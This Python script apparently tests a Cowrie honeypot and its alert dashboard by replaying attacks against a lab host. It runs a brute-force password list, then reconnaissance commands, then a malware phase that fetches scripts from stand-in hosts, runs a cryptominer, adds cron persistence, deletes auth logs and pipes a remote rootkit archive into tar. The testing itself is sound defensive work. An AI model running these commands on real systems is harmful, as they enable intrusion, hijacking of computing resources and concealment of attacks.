
# trigger_critical_alerts.py
# Runs all 3 attack types in sequence and confirms backend stats

import paramiko
import time
import requests

TARGET_IP   = "192.168.56.101"
TARGET_PORT = 22
USERNAME    = "root"
PASSWORD    = "hello"       # accepted by Cowrie
BACKEND_URL = "http://localhost:5001"

def ssh_connect_and_run(username, password, commands, label):
    print(f"\n{'='*55}")
    print(f"  {label}")
    print(f"{'='*55}")
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            TARGET_IP, port=TARGET_PORT,
            username=username, password=password,
            timeout=5, banner_timeout=5
        )
        for cmd in commands:
            try:
                client.exec_command(cmd)
                print(f"  ✓ {cmd}")
                time.sleep(1)
            except:
                pass
        client.close()
        print(f"  Session closed ✅")
    except paramiko.AuthenticationException:
        # For brute force — auth failure is expected and logged by Cowrie
        print(f"  Auth rejected (expected for brute force) ✅")
    except Exception as e:
        print(f"  ❌ Error: {e}")

def check_dashboard_stats():
    print(f"\n📊 Checking dashboard stats...")
    try:
        r = requests.get(f"{BACKEND_URL}/api/dashboard/stats", timeout=5)
        data = r.json()
        print(f"   Total Attacks   : {data.get('totalAttacks', 'N/A')}")
        print(f"   Active Sessions : {data.get('activeSessions', 'N/A')}")
        print(f"   Threat Level    : {data.get('threatLevel', 'N/A')}")
        print(f"   Countries       : {data.get('countriesDetected', 'N/A')}")
    except Exception as e:
        print(f"   Could not reach backend: {e}")
        print(f"   Make sure backend is running on port 5001")

# ── PHASE 1: BRUTE FORCE ─────────────────────────────────────
rejected_passwords = [
    ("root", "root"),
    ("root", "123456"),
    ("root", "admin"),
    ("root", "password"),
    ("root", "toor"),
    ("admin", "admin"),
    ("admin", "password"),
    ("root", "qwerty"),
    ("root", "letmein"),
    ("root", "abc123"),
    ("root", "dragon"),
    ("root", "master"),
]

print("\n🔴 PHASE 1: BRUTE FORCE ATTACK")
for user, pwd in rejected_passwords:
    ssh_connect_and_run(user, pwd, [], f"Brute Force: {user}:{pwd}")
    time.sleep(0.3)

print("\n⏳ Waiting 8 seconds for Cowrie to log to Elasticsearch...")
time.sleep(8)
check_dashboard_stats()

# ── PHASE 2: RECONNAISSANCE ───────────────────────────────────
print("\n🔍 PHASE 2: RECONNAISSANCE ATTACK")
ssh_connect_and_run(USERNAME, PASSWORD, [
    "whoami",
    "id",
    "uname -a",
    "cat /etc/passwd",
    "netstat -tulnp",
    "ps aux",
    "ls /home",
    "cat /etc/hosts",
    "df -h",
    "env",
], "Reconnaissance Session")

print("\n⏳ Waiting 8 seconds...")
time.sleep(8)
check_dashboard_stats()

# ── PHASE 3: MALWARE DOWNLOAD ─────────────────────────────────
print("\n☠️  PHASE 3: MALWARE DOWNLOAD — SHOULD TRIGGER CRITICAL ALERT + SMS")
ssh_connect_and_run(USERNAME, PASSWORD, [
    "whoami",
    "cd /tmp",
    "wget http://malware-test.com/shell.sh",
    "curl -O http://malware-test.com/backdoor.py",
    "wget -q http://198.51.100.1/miner.sh -O /tmp/miner.sh",
    "chmod +x /tmp/miner.sh",
    "bash /tmp/miner.sh",
    "wget http://198.51.100.1/xmrig -O /tmp/xmrig",
    "chmod 777 /tmp/xmrig",
    "./xmrig --url pool.minexmr.com:443",
    'echo "*/5 * * * * /tmp/miner.sh" | crontab -',
    "rm -rf /var/log/auth.log",
    "history -c",
    "curl http://malware-test.com/rootkit.tar.gz | tar xz",
], "Malware Download Session — CRITICAL")

print("\n⏳ Waiting 15 seconds for full pipeline + SMS dispatch...")
time.sleep(15)
check_dashboard_stats()

# ── FINAL SUMMARY ─────────────────────────────────────────────
print(f"\n{'='*55}")
print(f"  ALL SIMULATIONS COMPLETE")
print(f"{'='*55}")
print(f"  Now check:")
print(f"  → Dashboard  : http://localhost:3000")
print(f"  → Backend    : http://localhost:5001/api/dashboard/stats")
print(f"  → Kibana     : http://192.168.56.101:5601")
print(f"  → Your phone : SMS alert should have arrived")
print(f"{'='*55}")